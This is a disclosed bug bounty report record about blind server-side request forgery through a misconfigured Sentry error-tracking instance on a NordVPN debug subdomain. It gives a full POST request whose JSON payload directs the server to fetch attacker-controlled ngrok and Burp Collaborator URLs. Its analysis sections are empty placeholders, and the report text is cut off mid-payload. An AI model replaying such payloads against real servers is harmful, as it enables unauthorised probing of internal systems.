# Blind SSRF on debug.nordvpn.com due to misconfigured sentry instance

## Metadata
- **Source:** HackerOne
- **Report:** 756149 | https://hackerone.com/reports/756149
- **Submitted:** 2019-12-11
- **Reporter:** mase289
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Server-Side Request Forgery (SSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
The debug subdomain uses Sentry for application monitoring and error tracking.  This software comes with a feature (known as source code scraping ) turned on by default which makes it is possible to make blind get requests from the server on which it is running.

## Steps To Reproduce:
[add details for how we can reproduce the issue]
You can reproduce this using burpsuite  or any prefe

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
The debug subdomain uses Sentry for application monitoring and error tracking.  This software comes with a feature (known as source code scraping ) turned on by default which makes it is possible to make blind get requests from the server on which it is running.

## Steps To Reproduce:
[add details for how we can reproduce the issue]
You can reproduce this using burpsuite  or any preferred proxy software

  1. Make a POST request to the relevant endpoint  
`/api/4/store/?sentry_version=7&sentry_client=raven-js%2F3.27.1&sentry_key=48819d1178934516beea3f05a9e1ceed`

```
POST /api/4/store/?sentry_version=7&sentry_client=raven-js%2F3.27.1&sentry_key=48819d1178934516beea3f05a9e1ceed HTTP/1.1
Host: debug.nordvpn.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://join.nordvpn.com/
Content-Type: text/plain;charset=UTF-8
Origin: https://join.nordvpn.com
Content-Length: 9699
Connection: close

{"project":"4","logger":"javascript","platform":"javascript","request":{"headers":{"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0","Referer":"https://nwnzekunqxlyy3bux0v2buzbx23srh.burpcollaborator.net/features/"},"url":"http://2661b367.ngrok.io/?_ga=2.45523556.192632961.1576059112-1770582595.1576059112"},"exception":{"values":[{"type":"Error","value":"","stacktrace":{"frames":[{"filename":"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","lineno":1,"colno":437441,"function":"o/</o.onabort","in_app":true}]}}],"mechanism":{"type":"onunhandledrejection","handled":false}},"transaction":"https://"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","trimHeadFrames":0,"tags":{"app.version":"1.169.0"},"extra":{"state":{"nord.redux-api":{"GET/servers/count":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820513,"successPayload":null,"errorPayload":{"stack":"n@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:45308\nt@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:52883\no/<@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/users/plans":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820460,"successPayload":null,"errorPayload":{"stack":"n@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/payments/providers":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820451,"successPayload":null,"errorPayload":{"stack":"d@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:44945\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}}},"nordvpn.alert":{"queue":[]},"nordvpn.cached-api":{},"nordvpn.router-session":{"history":["/order/"]},"nordvpn.account":{"create":{"fetching":false,"email":null,"error":null,"account":null,"isStale":false},"createForm":{"errors":{}},"validation":{"fetching":false,"existing":false},"setPassword":{"fetching":false,"error":null}},"order.countdown":{"timestamp":1576059803753},"nordvpn.currency":{"currencyCode":"USD"},"router":{"location":{"pathname":"/order/","search":"?_ga=2.45523556.192632961.1576059112-1770582595.1576059112","hash":""},"action":"POP"},"nordvpn.order":{"selectedPlanId":null,"queryPlan":null,"orderId":null,"inputCache":null,"orderSubmitData":null,"dealCouponCode":null,"planInstallment":false},"nordvpn.order.taxes":{"selectedTaxCode":null},"nordvpn.order.payment-providers":{"selectedProviderId":null,"enableFallbackPaymentProviders":false},"nordvpn.order.coupons":{"activatedCouponCode":null,"couponAutoSetTimestamp":null},"_persist":{"version":-1,"rehydrated":true}},"session:duration":17577},"breadcrumbs":{"values":[{"timestamp":1576059803.193,"category":"redux-action","message":"persist/PERSIST"},{"timestamp":1576059803.236,"category":"redux-action","message":"persist/REHYDRATE"},{"timestamp":1576059803.244,"category":"redux-action"},{"timestamp":1576059803.244,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.245,"category":"redux-action"},{"timestamp":1576059803.246,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.246,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.247,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.251,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.252,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.253,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nord.redux-api.NORMALIZE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nordvpn.cached-api.NORMALIZE"},{"timestamp":1576059803.257,"category":"redux-action","message":"nordvpn.account.NORMALIZE"},{"timestamp":1576059803.258,"category":"redux-action"},{"timestamp":1576059803.259,"category":"redux-action","message":"nordvpn.order.NORMALIZE"},{"timestamp":1576059803.282,"category":"redux-action","message":"@@router/LOCATION_CHANGE"},{"timestamp":1576059803.284,"category":"redux-action"},{"timestamp":1576059803.284,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.285,"category":"redux-action"},{"timestamp":1576059803.285,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":157605980

</details>

---
*Analysed by Claude on 2026-05-24*
